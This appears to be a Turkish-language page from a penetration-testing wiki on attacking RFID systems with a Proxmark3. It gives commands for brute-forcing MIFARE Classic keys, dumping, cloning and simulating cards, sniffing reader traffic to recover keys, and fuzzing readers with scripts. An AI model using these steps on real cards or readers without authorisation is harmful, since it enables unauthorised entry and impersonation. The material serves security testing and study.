# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 ile RFID Sistemlerine Saldırma

Yapmanız gereken ilk şey bir [**Proxmark3**](https://proxmark.com) edinmek ve [**yazılımı ve bağımlılıklarını yüklemek**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### MIFARE Classic 1KB'ye Saldırma

**16 sektör** vardır, her birinde **4 blok** ve her blokta **16B** bulunur. UID, sektör 0 blok 0'da (ve değiştirilemez).\
Her sektöre erişmek için **2 anahtara** (**A** ve **B**) ihtiyacınız var, bunlar **her sektörün blok 3'ünde** saklanır (sektör trailer). Sektör trailer ayrıca **erişim bitlerini** saklar, bu bitler **her blokta** 2 anahtarı kullanarak **okuma ve yazma** izinleri verir.\
2 anahtar, ilkini biliyorsanız okumak için ve ikincisini biliyorsanız yazmak için izin vermek için kullanışlıdır (örneğin).

Birçok saldırı gerçekleştirilebilir.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3, hassas verileri bulmaya çalışmak için **Tag ile Reader iletişimini dinleme** gibi diğer eylemleri gerçekleştirmeye olanak tanır. Bu kartta, iletişimi dinleyebilir ve kullanılan anahtarı hesaplayabilirsiniz çünkü **kullanılan kriptografik işlemler zayıftır** ve düz metin ile şifreli metni bilerek bunu hesaplayabilirsiniz (`mfkey64` aracı).

### Ham Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, Proxmark3'ü etiketlere özel **ham komutlar göndermek** için kullanabilirsiniz.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Bu bilgilerle kart hakkında ve onunla iletişim kurma yöntemi hakkında bilgi aramayı deneyebilirsiniz. Proxmark3, şu şekilde ham komutlar göndermeye olanak tanır: `hf 14a raw -p -b 7 26`

### Scriptler

Proxmark3 yazılımı, basit görevleri yerine getirmek için kullanabileceğiniz önceden yüklenmiş bir **otomasyon scriptleri** listesi ile birlikte gelir. Tam listeyi almak için `script list` komutunu kullanın. Ardından, script'in adını takip eden `script run` komutunu kullanın:
```
proxmark3> script run mfkeys
```
Bir **fuzz tag okuyucuları** oluşturmak için bir script yazabilirsiniz, böylece bir **geçerli kartın** verilerini kopyalamak için sadece bir **Lua scripti** yazın, bir veya daha fazla rastgele **baytı** rastgeleleştirip **okuyucunun çöküp çökmediğini** kontrol edin. 

{{#include ../../banners/hacktricks-training.md}}
